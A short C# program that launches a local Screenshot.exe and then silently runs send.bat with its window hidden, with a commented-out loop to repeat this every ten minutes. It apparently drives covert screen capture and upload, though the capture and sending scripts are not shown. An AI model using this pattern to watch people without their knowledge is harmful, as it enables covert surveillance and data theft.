using System;
using System.Threading;

class Manager
{
    public static void Main(string[] args)
    {
        // Add 3 zeros
        Thread.Sleep(600);
        //while(true)
        //{
            Screenshot();
            Thread.Sleep(10000);
            InfoSend();
          //  Thread.Sleep(600000);
        //}
        
    }

    public static int Screenshot()
    {
        System.Diagnostics.Process process = new System.Diagnostics.Process();
        process.StartInfo.FileName = @".\Screenshot.exe";
        process.Start();

        return 0;
    }

    public static int InfoSend()
    {
        int errorLevel;
        
        System.Diagnostics.ProcessStartInfo processInfo = new System.Diagnostics.ProcessStartInfo();
        processInfo.FileName = "send.bat";
        processInfo.CreateNoWindow = true;
        processInfo.UseShellExecute = false;

        System.Diagnostics.Process process = new System.Diagnostics.Process();
        process.StartInfo = processInfo;
        process.Start();
        process.WaitForExit();

        errorLevel = process.ExitCode;
        process.Close();

        return errorLevel;
    }
}
